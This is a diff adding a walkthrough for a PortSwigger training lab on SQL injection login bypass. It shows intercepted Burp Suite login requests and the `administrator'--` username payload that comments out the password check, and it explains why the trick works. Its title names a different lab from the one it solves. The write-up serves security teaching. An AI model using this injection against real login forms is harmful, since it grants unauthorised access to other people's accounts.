@@ -1,0 +1,70 @@
+---
+title: >
+  Solution to Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+---
+
+The following is a solution to the lab titled ["Lab: SQL injection vulnerability allowing login bypass"](https://portswigger.net/web-security/sql-injection/lab-login-bypass).
+
+In Burp Suite, in the Proxy tab, click **Intercept is off**. This turns Intercept on, which will capture any incoming HTTP requests.
+
+In the user interface (UI) of the lab, attempt to log in using the username `administrator` and any password (in this case, `orange`). 
+
+Burp Suite Proxy will capture the login attempt and show an editable HTTP request like the one below:
+
+~~~
+POST /login HTTP/2
+Host: 0ad800d703f1319f80653f68009c00e5.web-security-academy.net
+Cookie: session=qgW9Lfp4Nnol2ItJDXq9NnxZhlUAeg4T
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://0ad800d703f1319f80653f68009c00e5.web-security-academy.net
+Referer: https://0ad800d703f1319f80653f68009c00e5.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+csrf=11a7DpsSQo8lKiyViRXJ1oMuidLD7zqI&username=administrator&password=orange
+~~~
+
+In the last line of the HTTP request, modify the text after `username`, adding `'--`. Note the following modified request.
+
+~~~
+POST /login HTTP/2
+Host: 0ad800d703f1319f80653f68009c00e5.web-security-academy.net
+Cookie: session=qgW9Lfp4Nnol2ItJDXq9NnxZhlUAeg4T
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://0ad800d703f1319f80653f68009c00e5.web-security-academy.net
+Referer: https://0ad800d703f1319f80653f68009c00e5.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+csrf=11a7DpsSQo8lKiyViRXJ1oMuidLD7zqI&username=administrator'--&password=orange
+~~~
+
+Click **Forward** and then click **Intercept is on** (to turn off Intercept).
+
+Navigate back to the UI. The UI should be logged in to the `administrator` account, and the lab should be marked as solved.
+
+---
+
+SQL Note
+
+The unmodified request sends a SQL query with the username `administrator` and the password `orange` to the back end for authentication. This login attempt fails, since `orange` is not the correct password.
+
+Adding `'--` after the username in the login request modifies the SQL query by instructing the server to regard everything after `'--` as a comment, thus telling the server to only check the username to give the user access to the account.
